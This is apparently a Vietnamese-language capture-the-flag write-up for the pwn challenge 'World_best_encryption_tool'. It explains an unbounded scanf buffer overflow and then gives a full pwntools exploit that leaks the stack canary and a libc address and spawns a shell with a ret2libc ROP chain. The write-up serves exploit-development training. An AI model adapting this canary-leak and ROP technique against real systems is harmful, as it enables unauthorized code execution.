# World_best_encryption_tool

# REVERSE

#### Chương trình cho nhập 2 lần:
* Nhập text vào, chương trình sẽ encrypt bằng thuật toán như sau:
```sh
for ( i = 0; i <= 0x31; ++i )
      src[i] ^= 0x1Cu;
```
* Nhập xác nhận (yes/no) cho việc thực hiện encrypt tiếp theo.
```sh
do{
    ...
__isoc99_scanf("%s", s1);
}
  while ( !strcmp(s1, "Yes") );
```
Hàm __isoc99_scanf() sử dụng đặc tả %s, nên chúng ta sẽ nhập 1 chuỗi, nhưng sẽ không giới hạn độ dài. --> buffer overflow.

# EXPLOIT

Khai thác chương trình theo 2 bước:
* leak canary, libc, tính base, system, binsh
* getshell

```py
#just solve at local
from pwn import *
s = process("./World_best_encryption_tool")
# s = remote("ctf.j0n9hyun.xyz", 3027)
elf = ELF("./World_best_encryption_tool")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# raw_input("debug")


RET = 0x4005be
POP_RDI = 0x4008e3
PUTS_GOT = 0x601020
PUTS_PLT = 0x4005e0

s.recvuntil("Your text)\n")
s.sendline("A"*0x78)

s.recvuntil("AAAAAAA")
canary = u64("\x00"+s.recv(7))
print hex(canary)
print "puts_got >>" + hex(elf.sym['got.puts'])

pl = "a"*0x7c 
pl += p64(canary)
pl += "A"*8
pl += p64(POP_RDI) 
pl += p64(0x601048)
pl += p64(PUTS_PLT)
pl += p64(elf.symbols['main'])

s.recvuntil("(Yes/No)\n")
s.sendline(pl)

s.recvuntil("It's not on the option")
leak = u64(s.recv(6).ljust(8,"\x00"))
libc.address = leak - libc.symbols['__isoc99_scanf']
system = libc.symbols['system']
binsh = next(libc.search("/bin/sh"))

log.info("__scanf {}".format(hex(leak)))
log.info("libc base {}".format(hex(libc.address)))
log.info("system {}".format(hex(system)))
log.info("binsh {}".format(hex(binsh)))

s.recv()
s.sendline("AzirComback!!!")
pl2 = "a"*0x7c
pl2 += p64(canary)
pl2 += p64(1)
pl2 += p64(POP_RDI)
pl2 += p64(binsh)
pl2 += p64(RET)
pl2 += p64(system)

s.recvuntil("(Yes/No)")
s.sendline(pl2)

s.interactive()
```